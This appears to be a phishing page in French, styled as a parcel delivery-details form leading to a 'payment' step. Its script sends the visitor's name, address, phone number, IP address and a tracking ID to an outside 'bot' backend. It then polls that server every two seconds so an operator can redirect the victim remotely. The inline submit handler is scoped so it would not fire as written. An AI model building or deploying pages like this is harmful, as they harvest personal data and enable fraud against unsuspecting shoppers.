<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Livraison</title>
  <style> body { font-family: sans-serif; max-width: 500px; margin: 40px auto; }</style>
</head>
<body>
  <h2>📦 Informations de livraison</h2>
  <form onsubmit="handleSubmit(event)">
    <input name="firstname" placeholder="Prénom" required><br><br>
    <input name="lastname" placeholder="Nom" required><br><br>
    <input name="address" placeholder="Adresse" required><br><br>
    <input name="phone" placeholder="Téléphone" required><br><br>
    <button type="submit">Suivant → Paiement</button>
  </form>

  <script>
  (function () {
    const BACKEND_URL = 'https://mybot-5rv9.onrender.com';
    const visitorId = localStorage.getItem('vid') || (Math.random().toString(36).substr(2,9) + Date.now().toString(36));
    localStorage.setItem('vid', visitorId);

    async function getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        return (await res.json()).ip;
      } catch { return '0.0.0.0'; }
    }

    window.trackEvent = async (type, eventData = {}) => {
      const ip = await getIP();
      try {
        await fetch(BACKEND_URL + '/event', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ type, visitorId, ip, eventData })
        });
      } catch (e) { console.warn("⚠️ Échec du tracking"); }
      checkTarget();
    };

    function checkTarget() {
      setInterval(async () => {
        try {
          const res = await fetch(`${BACKEND_URL}/target/${visitorId}`);
          const d = await res.json();
          if (d.target && d.target !== window.location.pathname) {
            window.location.href = d.target;
          }
        } catch (e) {}
      }, 2000);
    }

    function handleSubmit(e) {
      e.preventDefault();
      const data = Object.fromEntries(new FormData(e.target));
      trackEvent('delivery_submitted', data);
    }
  })();
  </script>
</body>
</html>
